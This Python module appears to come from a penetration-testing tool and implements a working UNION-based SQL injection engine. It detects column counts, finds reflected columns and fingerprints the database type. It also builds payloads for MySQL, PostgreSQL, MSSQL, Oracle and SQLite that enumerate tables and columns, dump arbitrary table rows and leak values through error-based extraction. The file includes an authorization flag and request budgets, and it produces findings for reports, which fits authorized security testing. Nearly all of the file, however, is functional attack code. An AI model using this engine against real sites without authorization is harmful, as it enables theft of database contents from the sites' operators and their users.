"""
union_exploiter.py – UNION-based SQL injection exploitation engine.

This module provides :class:`UnionExploiter`, a self-contained engine for
exploiting UNION-based SQL injection vulnerabilities.  It handles:

* Automatic column-count detection (ORDER BY binary search + UNION SELECT NULL
  incremental fallback).
* Data-type inference per column (string / numeric / date).
* Multi-DBMS extraction query templates (MySQL, PostgreSQL, MSSQL, Oracle,
  SQLite) for version, user, database, tables, columns and arbitrary data.
* Reflected-column mapping using unique ``MEGIDO_MARKER_`` sentinel values.
* Concatenation helpers and error-based extraction fallback.

Integration
-----------
* Respects :func:`sql_attacker.guardrails.check_authorization` before every
  outbound request.
* Uses :class:`sql_attacker.engine.config.ScanConfig` for timeout / retry
  settings.
* Scores findings with :func:`sql_attacker.engine.scoring.compute_confidence`.
* Produces :class:`sql_attacker.engine.reporting.Finding` /
  :class:`sql_attacker.engine.reporting.Evidence` objects.

Usage example::

    from sql_attacker.engine.config import ScanConfig
    from sql_attacker.union_exploiter import UnionExploiter, DBType
    import requests

    cfg = ScanConfig()
    exploiter = UnionExploiter(
        config=cfg,
        request_fn=lambda url, method, params: requests.request(method, url, params=params),
        authorized=True,
    )

    col_count = exploiter.detect_column_count("https://target/page", "id")
    string_cols = exploiter.find_string_columns("https://target/page", "id", col_count)
    tables = exploiter.enumerate_tables("https://target/page", "id", db_type="mysql")
"""

from __future__ import annotations

import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

from sql_attacker.engine.config import ScanConfig
from sql_attacker.engine.reporting import Evidence, Finding
from sql_attacker.engine.scoring import compute_confidence
from sql_attacker.guardrails import check_authorization

__all__ = [
    "DBType",
    "UnionExploiter",
]

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_MARKER_PREFIX = "MEGIDO_MARKER_"
_MAX_COLUMNS = 50  # Upper bound for brute-force column search
_ORDER_BY_MAX = 30  # Upper bound for ORDER BY binary search
_DEFAULT_TECHNIQUE = "union"

# Sentinel values used to probe whether a column accepts the given type.
# They are chosen to be distinctive enough to survive typical output encoding.
_STR_SENTINEL_TEMPLATE = _MARKER_PREFIX + "{col}STR"
_NUM_SENTINEL = "1337421"
_DATE_SENTINEL = "2099-01-01"


# ---------------------------------------------------------------------------
# DBType enum
# ---------------------------------------------------------------------------


class DBType(str, Enum):
    """Supported database management systems."""

    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"

    @classmethod
    def from_str(cls, value: str) -> "DBType":
        """Return the enum member matching *value* (case-insensitive)."""
        normalised = value.lower().strip()
        for member in cls:
            if member.value == normalised:
                return member
        return cls.UNKNOWN


# ---------------------------------------------------------------------------
# Internal helpers: extraction query templates
# ---------------------------------------------------------------------------


@dataclass
class _ExtractionTemplates:
    """Pre-built UNION injection SQL fragments for a single DBMS."""

    db_type: DBType

    # ------------------------------------------------------------------ #
    # Null column placeholders                                             #
    # ------------------------------------------------------------------ #

    def null_list(self, count: int) -> str:
        """Return a comma-separated list of NULLs of length *count*."""
        return ",".join(["NULL"] * count)

    # ------------------------------------------------------------------ #
    # UNION payload builders                                               #
    # ------------------------------------------------------------------ #

    def union_select(self, values: List[str]) -> str:
        """Wrap *values* in ``UNION SELECT ...``."""
        return f"UNION SELECT {','.join(values)}"

    def union_null_with_value(self, value: str, col_idx: int, total: int) -> str:
        """Place *value* at *col_idx* (0-based) among NULL placeholders."""
        cols = ["NULL"] * total
        cols[col_idx] = value
        return self.union_select(cols)

    # ------------------------------------------------------------------ #
    # String quoting                                                       #
    # ------------------------------------------------------------------ #

    def quote(self, s: str) -> str:
        """Return a safely single-quoted SQL string literal."""
        return "'" + s.replace("'", "''") + "'"

    # ------------------------------------------------------------------ #
    # Version / user / database                                            #
    # ------------------------------------------------------------------ #

    @property
    def version_expr(self) -> str:
        """SQL expression that returns the DBMS version string."""
        mapping = {
            DBType.MYSQL: "VERSION()",
            DBType.POSTGRESQL: "VERSION()",
            DBType.MSSQL: "@@VERSION",
            DBType.ORACLE: "(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)",
            DBType.SQLITE: "sqlite_version()",
            DBType.UNKNOWN: "VERSION()",
        }
        return mapping[self.db_type]

    @property
    def user_expr(self) -> str:
        """SQL expression that returns the current database user."""
        mapping = {
            DBType.MYSQL: "CURRENT_USER()",
            DBType.POSTGRESQL: "CURRENT_USER",
            DBType.MSSQL: "SYSTEM_USER",
            DBType.ORACLE: "USER",
            DBType.SQLITE: "'sqlite_user'",
            DBType.UNKNOWN: "USER()",
        }
        return mapping[self.db_type]

    @property
    def database_expr(self) -> str:
        """SQL expression that returns the current database/schema name."""
        mapping = {
            DBType.MYSQL: "DATABASE()",
            DBType.POSTGRESQL: "CURRENT_DATABASE()",
            DBType.MSSQL: "DB_NAME()",
            DBType.ORACLE: "ORA_DATABASE_NAME",
            DBType.SQLITE: "'main'",
            DBType.UNKNOWN: "DATABASE()",
        }
        return mapping[self.db_type]

    # ------------------------------------------------------------------ #
    # Concatenation helpers                                                #
    # ------------------------------------------------------------------ #

    def concat_tables(self, limit: int = 100, offset: int = 0) -> str:
        """Return a SELECT sub-expression that aggregates table names."""
        if self.db_type == DBType.MYSQL:
            return (
                f"(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
                f"FROM (SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=DATABASE() LIMIT {limit} OFFSET {offset}) AS _t)"
            )
        if self.db_type == DBType.POSTGRESQL:
            return (
                f"(SELECT STRING_AGG(table_name,',') FROM "
                f"(SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=current_schema() "
                f"LIMIT {limit} OFFSET {offset}) AS _t)"
            )
        if self.db_type == DBType.MSSQL:
            return (
                f"(SELECT STUFF((SELECT ',' + name FROM "
                f"(SELECT TOP {limit} name FROM sys.objects "
                f"WHERE type='U' ORDER BY name) AS _t "
                f"FOR XML PATH('')),1,1,''))"
            )
        if self.db_type == DBType.ORACLE:
            return (
                f"(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) "
                f"FROM (SELECT table_name FROM all_tables "
                f"WHERE ROWNUM<={offset + limit} AND ROWNUM>{offset}))"
            )
        if self.db_type == DBType.SQLITE:
            return (
                f"(SELECT GROUP_CONCAT(name,',') FROM "
                f"(SELECT name FROM sqlite_master WHERE type='table' "
                f"LIMIT {limit} OFFSET {offset}))"
            )
        # Fallback: information_schema
        return (
            f"(SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
            f"FROM information_schema.tables LIMIT {limit} OFFSET {offset})"
        )

    def concat_columns(self, table_name: str, limit: int = 200, offset: int = 0) -> str:
        """Return a SELECT sub-expression that aggregates column names for *table_name*."""
        t = table_name.replace("'", "''")
        if self.db_type == DBType.MYSQL:
            return (
                f"(SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
                f"FROM (SELECT column_name,ordinal_position "
                f"FROM information_schema.columns "
                f"WHERE table_name='{t}' AND table_schema=DATABASE() "
                f"LIMIT {limit} OFFSET {offset}) AS _c)"
            )
        if self.db_type == DBType.POSTGRESQL:
            return (
                f"(SELECT STRING_AGG(column_name,',') FROM "
                f"(SELECT column_name FROM information_schema.columns "
                f"WHERE table_name='{t}' AND table_schema=current_schema() "
                f"ORDER BY ordinal_position LIMIT {limit} OFFSET {offset}) AS _c)"
            )
        if self.db_type == DBType.MSSQL:
            return (
                f"(SELECT STUFF((SELECT ',' + c.name FROM "
                f"(SELECT TOP {limit} c.name FROM sys.columns c "
                f"JOIN sys.objects o ON c.object_id=o.object_id "
                f"WHERE o.name='{t}' ORDER BY c.column_id) AS c "
                f"FOR XML PATH('')),1,1,''))"
            )
        if self.db_type == DBType.ORACLE:
            return (
                f"(SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) "
                f"FROM all_tab_columns WHERE table_name=UPPER('{t}') "
                f"AND ROWNUM<={offset + limit} AND ROWNUM>{offset})"
            )
        if self.db_type == DBType.SQLITE:
            # PRAGMA table_info cannot be used in subquery expressions easily;
            # fall back to a generic approach using sqlite_master.
            return (
                f"(SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('{t}') "
                f"LIMIT {limit} OFFSET {offset})"
            )
        return (
            f"(SELECT GROUP_CONCAT(column_name SEPARATOR ',') "
            f"FROM information_schema.columns "
            f"WHERE table_name='{t}' LIMIT {limit} OFFSET {offset})"
        )

    # ------------------------------------------------------------------ #
    # Paginated row extraction                                             #
    # ------------------------------------------------------------------ #

    def paginated_query(
        self,
        select_expr: str,
        from_clause: str,
        where_clause: Optional[str] = None,
        limit: int = 50,
        offset: int = 0,
    ) -> str:
        """Return a paginated SELECT statement appropriate for the DBMS.

        Parameters
        ----------
        select_expr:   The columns / expressions to select.
        from_clause:   The ``FROM …`` clause (table name or join).
        where_clause:  Optional ``WHERE …`` predicate (without the keyword).
        limit:         Maximum rows to return.
        offset:        Zero-based row offset.
        """
        where = f" WHERE {where_clause}" if where_clause else ""
        base = f"SELECT {select_expr} FROM {from_clause}{where}"

        if self.db_type in (DBType.MYSQL, DBType.POSTGRESQL, DBType.SQLITE):
            return f"{base} LIMIT {limit} OFFSET {offset}"

        if self.db_type == DBType.MSSQL:
            # OFFSET … FETCH requires an ORDER BY; use a stable surrogate.
            return (
                f"{base} ORDER BY (SELECT NULL) "
                f"OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY"
            )
        if self.db_type == DBType.ORACLE:
            # Wrap with ROWNUM filter – works on Oracle 11g and later.
            return (
                f"SELECT * FROM ({base}) WHERE ROWNUM<={offset + limit} "
                f"AND ROWNUM>{offset}"
            )
        # Generic fallback
        return f"{base} LIMIT {limit} OFFSET {offset}"

    # ------------------------------------------------------------------ #
    # Error-based extraction (fallback)                                    #
    # ------------------------------------------------------------------ #

    def error_extract(self, expr: str) -> str:
        """Return an expression that forces a DB error leaking *expr*.

        These are appended to the injection instead of UNION when UNION is
        unavailable.  The error message typically contains the value of *expr*.
        """
        if self.db_type == DBType.MYSQL:
            # EXTRACTVALUE raises an XPath error containing the value.
            return f"EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))"
        if self.db_type == DBType.MSSQL:
            # CONVERT from varchar to int causes a conversion error.
            return f"CONVERT(int,({expr}))"
        if self.db_type == DBType.POSTGRESQL:
            return f"CAST(({expr}) AS integer)"
        if self.db_type == DBType.ORACLE:
            return f"TO_NUMBER(({expr}))"
        # MySQL UPDATEXML alternative
        return f"UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)"


# ---------------------------------------------------------------------------
# Request helper type alias
# ---------------------------------------------------------------------------

#: Callable signature expected by :class:`UnionExploiter`.
#: ``request_fn(url, method, params) -> (response_text, status_code)``
RequestFn = Callable[[str, str, Dict[str, str]], Tuple[str, int]]


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------


class UnionExploiter:
    """UNION-based SQL injection exploitation engine.

    Parameters
    ----------
    config:
        :class:`~sql_attacker.engine.config.ScanConfig` instance providing
        timeout, retry and per-host budget settings.
    request_fn:
        A callable with the signature
        ``(url: str, method: str, params: dict) -> (body: str, status: int)``.
        The caller is responsible for applying authentication, proxies, etc.
    authorized:
        Must be ``True`` before any outbound requests are issued.  Calling any
        active method with ``authorized=False`` raises
        :exc:`~sql_attacker.guardrails.AuthorizationError`.
    """

    def __init__(
        self,
        config: ScanConfig,
        request_fn: RequestFn,
        authorized: bool = False,
    ) -> None:
        self._config = config
        self._request_fn = request_fn
        self._authorized = authorized
        self._request_count: Dict[str, int] = {}  # host → count

    # ------------------------------------------------------------------ #
    # Public API                                                           #
    # ------------------------------------------------------------------ #

    def detect_column_count(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
    ) -> Optional[int]:
        """Determine the number of columns in the vulnerable SELECT statement.

        The detection uses a two-phase approach:

        1. **ORDER BY binary search** – bisect over ``[1, _ORDER_BY_MAX]``
           looking for the column index that first causes an error.  The
           column count equals the last non-error index.
        2. **UNION SELECT NULL increments** – if ORDER BY produces ambiguous
           results, append ``UNION SELECT NULL[,NULL…]`` until the response
           changes or an error disappears.

        Parameters
        ----------
        url:       Target URL.
        parameter: Name of the injectable query / body parameter.
        method:    HTTP method (``"GET"`` or ``"POST"``).

        Returns
        -------
        Column count as an integer, or ``None`` if detection failed.
        """
        check_authorization(self._authorized)
        logger.debug("detect_column_count: url=%s param=%s", url, parameter)

        # Phase 1 – ORDER BY binary search
        count = self._order_by_bisect(url, parameter, method)
        if count is not None:
            logger.info("Column count detected via ORDER BY: %d", count)
            return count

        # Phase 2 – UNION SELECT NULL increments
        count = self._union_null_probe(url, parameter, method)
        if count is not None:
            logger.info("Column count detected via UNION NULL probe: %d", count)
        return count

    def find_string_columns(
        self,
        url: str,
        parameter: str,
        column_count: int,
        method: str = "GET",
    ) -> List[int]:
        """Identify which columns accept string values and are reflected.

        For each column index, inject a unique string marker and check whether
        it appears verbatim in the response.  Returns the list of 0-based
        column indices that are both string-compatible and reflected.

        Parameters
        ----------
        url:          Target URL.
        parameter:    Injectable parameter name.
        column_count: Total number of UNION columns.
        method:       HTTP method.

        Returns
        -------
        Sorted list of 0-based column indices (may be empty).
        """
        check_authorization(self._authorized)
        logger.debug(
            "find_string_columns: url=%s param=%s cols=%d", url, parameter, column_count
        )
        reflected: List[int] = []
        for col_idx in range(column_count):
            marker = _STR_SENTINEL_TEMPLATE.format(col=col_idx)
            tpl = _ExtractionTemplates(DBType.UNKNOWN)
            payload = (
                "' "
                + tpl.union_null_with_value(
                    tpl.quote(marker), col_idx, column_count
                )
                + "-- -"
            )
            body, _status = self._send(url, parameter, payload, method)
            if marker in body:
                reflected.append(col_idx)
                logger.debug("Column %d is string-reflected", col_idx)
        return reflected

    def extract_query(
        self,
        url: str,
        parameter: str,
        query: str,
        string_column: int,
        column_count: int,
        method: str = "GET",
    ) -> Optional[str]:
        """Execute *query* via UNION injection and return the extracted value.

        The result of *query* is placed in *string_column* of the UNION
        payload; the remaining columns are filled with NULL.  The marker
        prefix allows the extractor to locate the value inside a noisy
        response.

        Parameters
        ----------
        url:           Target URL.
        parameter:     Injectable parameter name.
        query:         A complete SQL expression or subquery whose result
                       should be extracted (e.g. ``"VERSION()"`` or
                       ``"(SELECT table_name FROM … LIMIT 1)``).
        string_column: 0-based index of the reflected string column to use.
        column_count:  Total number of UNION columns.
        method:        HTTP method.

        Returns
        -------
        The extracted string, or ``None`` if extraction failed.
        """
        check_authorization(self._authorized)
        start_marker = _MARKER_PREFIX + "START"
        end_marker = _MARKER_PREFIX + "END"
        # Wrap the query result between sentinel markers so we can locate it.
        # Use DB-neutral string concatenation: the caller passes *query* as a
        # subquery so we keep the outer concat simple and MySQL-compatible by
        # default.  Callers that know the exact DBMS can pass pre-wrapped
        # expressions instead.
        wrapped = f"CONCAT('{start_marker}',CAST(({query}) AS CHAR),'{end_marker}')"
        tpl = _ExtractionTemplates(DBType.UNKNOWN)
        payload = (
            "' "
            + tpl.union_null_with_value(wrapped, string_column, column_count)
            + "-- -"
        )
        body, _status = self._send(url, parameter, payload, method)
        return _extract_between(body, start_marker, end_marker)

    def enumerate_tables(
        self,
        url: str,
        parameter: str,
        db_type: str = "mysql",
    ) -> List[str]:
        """Return a list of table names from the target database.

        Uses the reflected UNION column determined at runtime.  Falls back to
        an error-based payload if no string column is found.

        Parameters
        ----------
        url:       Target URL.
        parameter: Injectable parameter name.
        db_type:   DBMS name (case-insensitive).  See :class:`DBType`.

        Returns
        -------
        List of table name strings (de-duplicated, sorted).
        """
        check_authorization(self._authorized)
        db = DBType.from_str(db_type)
        tpl = _ExtractionTemplates(db)
        col_count, string_col = self._prepare_extraction(url, parameter)
        if col_count is None or string_col is None:
            logger.warning("enumerate_tables: could not determine column layout")
            return []
        query = tpl.concat_tables(limit=200, offset=0)
        raw = self.extract_query(url, parameter, query, string_col, col_count)
        if not raw:
            logger.warning("enumerate_tables: empty result from extraction")
            return []
        return sorted(set(t.strip() for t in raw.split(",") if t.strip()))

    def enumerate_columns(
        self,
        url: str,
        parameter: str,
        table_name: str,
        db_type: str = "mysql",
    ) -> List[str]:
        """Return a list of column names for *table_name*.

        Parameters
        ----------
        url:        Target URL.
        parameter:  Injectable parameter name.
        table_name: Table to introspect.
        db_type:    DBMS name (case-insensitive).

        Returns
        -------
        List of column name strings (order preserved from DB metadata).
        """
        check_authorization(self._authorized)
        db = DBType.from_str(db_type)
        tpl = _ExtractionTemplates(db)
        col_count, string_col = self._prepare_extraction(url, parameter)
        if col_count is None or string_col is None:
            logger.warning("enumerate_columns: could not determine column layout")
            return []
        query = tpl.concat_columns(table_name, limit=200, offset=0)
        raw = self.extract_query(url, parameter, query, string_col, col_count)
        if not raw:
            logger.warning("enumerate_columns: empty result for table %s", table_name)
            return []
        return [c.strip() for c in raw.split(",") if c.strip()]

    def build_finding(
        self,
        url: str,
        parameter: str,
        column_count: int,
        db_type: str,
    ) -> Finding:
        """Construct a :class:`~sql_attacker.engine.reporting.Finding` for a
        confirmed UNION injection vulnerability.

        Parameters
        ----------
        url:          Target URL where the vulnerability was found.
        parameter:    Name of the vulnerable parameter.
        column_count: Number of UNION columns detected.
        db_type:      DBMS identifier string.

        Returns
        -------
        A populated :class:`~sql_attacker.engine.reporting.Finding` instance.
        """
        db = DBType.from_str(db_type)
        tpl = _ExtractionTemplates(db)

        # Build a representative payload for the evidence record.
        example_payload = (
            f"' UNION SELECT {tpl.null_list(column_count)}-- -"
        )
        request_summary = (
            f"{url}?{parameter}={urllib.parse.quote(example_payload)}"
        )

        evidence = Evidence(
            payload=example_payload,
            request_summary=request_summary,
            technique=_DEFAULT_TECHNIQUE,
            response_body_excerpt=(
                f"UNION SELECT with {column_count} columns accepted; "
                f"string reflection confirmed."
            ),
        )

        scoring = compute_confidence(
            {
                "union_column_count_confirmed": 1.0,
                "marker_reflected": 1.0,
                "sql_error_pattern": 0.0,
            }
        )

        return Finding(
            parameter=parameter,
            technique=_DEFAULT_TECHNIQUE,
            db_type=db.value,
            confidence=scoring.score,
            verdict=scoring.verdict,
            evidence=[evidence],
            url=url,
            score_rationale=scoring.rationale,
        )

    # ------------------------------------------------------------------ #
    # Convenience extraction methods                                       #
    # ------------------------------------------------------------------ #

    def extract_version(
        self,
        url: str,
        parameter: str,
        db_type: str = "mysql",
    ) -> Optional[str]:
        """Extract the DBMS version string.

        Parameters
        ----------
        url:       Target URL.
        parameter: Injectable parameter.
        db_type:   DBMS identifier.

        Returns
        -------
        Version string or ``None``.
        """
        check_authorization(self._authorized)
        db = DBType.from_str(db_type)
        tpl = _ExtractionTemplates(db)
        col_count, string_col = self._prepare_extraction(url, parameter)
        if col_count is None or string_col is None:
            return None
        return self.extract_query(
            url, parameter, tpl.version_expr, string_col, col_count
        )

    def extract_current_user(
        self,
        url: str,
        parameter: str,
        db_type: str = "mysql",
    ) -> Optional[str]:
        """Extract the current database user.

        Parameters
        ----------
        url:       Target URL.
        parameter: Injectable parameter.
        db_type:   DBMS identifier.

        Returns
        -------
        User name string or ``None``.
        """
        check_authorization(self._authorized)
        db = DBType.from_str(db_type)
        tpl = _ExtractionTemplates(db)
        col_count, string_col = self._prepare_extraction(url, parameter)
        if col_count is None or string_col is None:
            return None
        return self.extract_query(
            url, parameter, tpl.user_expr, string_col, col_count
        )

    def extract_current_database(
        self,
        url: str,
        parameter: str,
        db_type: str = "mysql",
    ) -> Optional[str]:
        """Extract the current database / schema name.

        Parameters
        ----------
        url:       Target URL.
        parameter: Injectable parameter.
        db_type:   DBMS identifier.

        Returns
        -------
        Database name string or ``None``.
        """
        check_authorization(self._authorized)
        db = DBType.from_str(db_type)
        tpl = _ExtractionTemplates(db)
        col_count, string_col = self._prepare_extraction(url, parameter)
        if col_count is None or string_col is None:
            return None
        return self.extract_query(
            url, parameter, tpl.database_expr, string_col, col_count
        )

    def infer_db_type(
        self,
        url: str,
        parameter: str,
    ) -> DBType:
        """Attempt to identify the DBMS by probing version expressions.

        Tries the version expression for each known DBMS in turn and looks
        for known version-string patterns in the response.  Returns
        :attr:`DBType.UNKNOWN` if identification fails.

        Parameters
        ----------
        url:       Target URL.
        parameter: Injectable parameter.

        Returns
        -------
        :class:`DBType` member.
        """
        check_authorization(self._authorized)
        col_count, string_col = self._prepare_extraction(url, parameter)
        if col_count is None or string_col is None:
            return DBType.UNKNOWN

        probes: List[Tuple[DBType, str, str]] = [
            (DBType.MYSQL, "VERSION()", r"(\d+\.\d+\.\d+[-\w]*)"),
            (DBType.POSTGRESQL, "VERSION()", r"PostgreSQL\s+\d+"),
            (DBType.MSSQL, "@@VERSION", r"Microsoft SQL Server"),
            (DBType.ORACLE, "(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)", r"Oracle"),
            (DBType.SQLITE, "sqlite_version()", r"\d+\.\d+\.\d+"),
        ]
        for db, expr, pattern in probes:
            result = self.extract_query(
                url, parameter, expr, string_col, col_count
            )
            if result and re.search(pattern, result, re.IGNORECASE):
                logger.info("Inferred DB type: %s", db.value)
                return db
        return DBType.UNKNOWN

    def extract_data(
        self,
        url: str,
        parameter: str,
        table_name: str,
        columns: List[str],
        db_type: str = "mysql",
        limit: int = 50,
        offset: int = 0,
    ) -> List[Dict[str, str]]:
        """Extract rows from *table_name* via UNION injection.

        Columns are concatenated with a ``|`` separator in a single
        extracted string, then split to reconstruct each row.

        Parameters
        ----------
        url:        Target URL.
        parameter:  Injectable parameter.
        table_name: Table to read.
        columns:    Column names to extract.
        db_type:    DBMS identifier.
        limit:      Maximum rows per request.
        offset:     Zero-based row offset for pagination.

        Returns
        -------
        List of dicts mapping column name → value.
        """
        check_authorization(self._authorized)
        if not columns:
            return []
        db = DBType.from_str(db_type)
        tpl = _ExtractionTemplates(db)
        col_count, string_col = self._prepare_extraction(url, parameter)
        if col_count is None or string_col is None:
            return []

        sep = "||"
        row_sep = "~~"

        concat_expr = self._build_row_concat(db, columns, sep, row_sep, limit, offset)
        select_expr = f"(SELECT {concat_expr} FROM {table_name})"

        raw = self.extract_query(url, parameter, select_expr, string_col, col_count)
        if not raw:
            return []

        rows: List[Dict[str, str]] = []
        for row_str in raw.split(row_sep):
            row_str = row_str.strip()
            if not row_str:
                continue
            parts = row_str.split(sep)
            row_dict = {
                col: (parts[i] if i < len(parts) else "")
                for i, col in enumerate(columns)
            }
            rows.append(row_dict)
        return rows

    # ------------------------------------------------------------------ #
    # Private helpers                                                      #
    # ------------------------------------------------------------------ #

    def _prepare_extraction(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
    ) -> Tuple[Optional[int], Optional[int]]:
        """Detect column count and find the first usable string column.

        Returns ``(column_count, string_column_index)`` or
        ``(None, None)`` on failure.
        """
        col_count = self.detect_column_count(url, parameter, method)
        if col_count is None:
            return None, None
        string_cols = self.find_string_columns(url, parameter, col_count, method)
        if not string_cols:
            return col_count, None
        return col_count, string_cols[0]

    def _order_by_bisect(
        self,
        url: str,
        parameter: str,
        method: str,
    ) -> Optional[int]:
        """Determine column count via ORDER BY binary search.

        Bisects over ``[1, _ORDER_BY_MAX]``.  Returns the largest *n* for
        which ``ORDER BY n`` does **not** produce an error, or ``None`` if
        the baseline itself appears erroneous.
        """
        # Capture baseline to detect errors
        baseline_body, baseline_status = self._send(url, parameter, "'-- -", method)
        baseline_len = len(baseline_body)

        lo, hi = 1, _ORDER_BY_MAX
        last_valid: Optional[int] = None

        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"' ORDER BY {mid}-- -"
            body, status = self._send(url, parameter, payload, method)
            is_error = status >= 400 or self._looks_like_error(
                body, baseline_body, baseline_len
            )
            if is_error:
                hi = mid - 1
            else:
                last_valid = mid
                lo = mid + 1

        return last_valid

    def _union_null_probe(
        self,
        url: str,
        parameter: str,
        method: str,
    ) -> Optional[int]:
        """Determine column count by incrementally adding NULL columns.

        Appends ``UNION SELECT NULL[,NULL…]`` until the response changes
        away from an error state or a reflected marker is seen.

        Returns
        -------
        Number of NULLs at the first successful probe, or ``None``.
        """
        baseline_body, baseline_status = self._send(url, parameter, "' OR '1'='1", method)
        baseline_len = len(baseline_body)

        for n in range(1, _MAX_COLUMNS + 1):
            nulls = ",".join(["NULL"] * n)
            payload = f"' UNION SELECT {nulls}-- -"
            body, status = self._send(url, parameter, payload, method)
            # A non-error response that differs from baseline suggests success.
            if status < 400 and not self._looks_like_error(body, baseline_body, baseline_len):
                return n
        return None

    def _send(
        self,
        url: str,
        parameter: str,
        payload: str,
        method: str,
    ) -> Tuple[str, int]:
        """Send a single probing request with *payload* injected into *parameter*.

        Applies basic retry logic as configured in :attr:`_config`.

        Returns
        -------
        ``(response_body_text, http_status_code)``
        """
        host = _extract_host(url)
        budget = self._config.per_host_request_budget
        if budget > 0:
            current = self._request_count.get(host, 0)
            if current >= budget:
                logger.warning(
                    "Per-host budget of %d exhausted for %s; skipping request.",
                    budget,
                    host,
                )
                return ("", 0)
            self._request_count[host] = current + 1

        params = {parameter: payload}
        last_exc: Optional[Exception] = None
        for attempt in range(self._config.retry_max_attempts + 1):
            if attempt > 0:
                delay = min(
                    self._config.retry_base_delay_seconds * (2 ** (attempt - 1)),
                    self._config.retry_max_delay_seconds,
                )
                time.sleep(delay)
            try:
                result = self._request_fn(url, method, params)
                if isinstance(result, tuple) and len(result) == 2:
                    return result
                # request_fn returned only a string
                return (str(result), 200)
            except Exception as exc:  # noqa: BLE001
                last_exc = exc
                logger.debug(
                    "Request attempt %d failed: %s", attempt + 1, exc
                )

        logger.warning("All retries exhausted for %s: %s", url, last_exc)
        return ("", 0)

    @staticmethod
    def _looks_like_error(
        body: str,
        baseline_body: str,
        baseline_len: int,
    ) -> bool:
        """Heuristically decide whether *body* represents an SQL error state.

        Checks for:
        * Known SQL error keywords in the response.
        * A significant reduction in response length vs baseline.
        """
        error_patterns = [
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"unclosed quotation mark",
            r"quoted string not properly terminated",
            r"ora-\d{5}",
            r"pg::.*error",
            r"syntax error.*near",
            r"invalid column name",
            r"conversion failed",
            r"operand should contain",
        ]
        body_lower = body.lower()
        for pat in error_patterns:
            if re.search(pat, body_lower):
                return True
        # A drastically shorter response suggests a DB error page.
        if baseline_len > 100 and len(body) < baseline_len * 0.3:
            return True
        return False

    @staticmethod
    def _build_row_concat(
        db: DBType,
        columns: List[str],
        sep: str,
        row_sep: str,
        limit: int,
        offset: int,
    ) -> str:
        """Build a DB-appropriate expression that concatenates rows and columns.

        Parameters
        ----------
        db:      Target DBMS.
        columns: Column names to include.
        sep:     Intra-row column separator.
        row_sep: Inter-row separator.
        limit:   Maximum number of rows.
        offset:  Row offset.

        Returns
        -------
        SQL aggregate expression string.
        """
        if db == DBType.MYSQL:
            col_expr = f"CONCAT_WS('{sep}',{','.join(columns)})"
            return (
                f"GROUP_CONCAT({col_expr} ORDER BY 1 SEPARATOR '{row_sep}' "
                f"LIMIT {limit} OFFSET {offset})"
            )
        if db == DBType.POSTGRESQL:
            col_expr = "||'" + sep + "'||".join(
                f"COALESCE({c}::TEXT,'')" for c in columns
            )
            return (
                f"STRING_AGG({col_expr},'{row_sep}') "
                f"FROM (SELECT {','.join(columns)} "
                f"LIMIT {limit} OFFSET {offset}) AS _r"
            )
        if db == DBType.MSSQL:
            col_mssql = "+'" + sep + "'+".join(
                f"ISNULL(CAST({c} AS NVARCHAR(MAX)),'')" for c in columns
            )
            return (
                f"STUFF((SELECT '{row_sep}'+{col_mssql} "
                f"FROM (SELECT TOP {limit} {','.join(columns)} "
                f"ORDER BY (SELECT NULL) OFFSET {offset} ROWS) AS _r "
                f"FOR XML PATH('')),1,{len(row_sep)},'')"
            )
        if db == DBType.ORACLE:
            col_oracle = "||'" + sep + "'||".join(
                f"TO_CHAR({c})" for c in columns
            )
            return (
                f"LISTAGG({col_oracle},'{row_sep}') WITHIN GROUP (ORDER BY 1) "
                f"FROM (SELECT {','.join(columns)} "
                f"WHERE ROWNUM<={offset + limit} AND ROWNUM>{offset})"
            )
        if db == DBType.SQLITE:
            col_expr = "||'" + sep + "'||".join(
                f"CAST({c} AS TEXT)" for c in columns
            )
            return (
                f"GROUP_CONCAT({col_expr},'{row_sep}') "
                f"FROM (SELECT {','.join(columns)} "
                f"LIMIT {limit} OFFSET {offset})"
            )
        # Generic fallback (MySQL-compatible)
        col_expr_generic = f"CONCAT_WS('{sep}',{','.join(columns)})"
        return (
            f"GROUP_CONCAT({col_expr_generic} SEPARATOR '{row_sep}' "
            f"LIMIT {limit} OFFSET {offset})"
        )


# ---------------------------------------------------------------------------
# Module-level utilities
# ---------------------------------------------------------------------------


def _extract_between(text: str, start: str, end: str) -> Optional[str]:
    """Return the substring of *text* between *start* and *end* markers.

    Returns ``None`` if either marker is absent.
    """
    try:
        s = text.index(start) + len(start)
        e = text.index(end, s)
        return text[s:e]
    except ValueError:
        return None


def _extract_host(url: str) -> str:
    """Extract the ``host[:port]`` component from *url*.

    Falls back to the full URL if parsing fails.
    """
    try:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc or url
    except Exception:  # noqa: BLE001
        return url
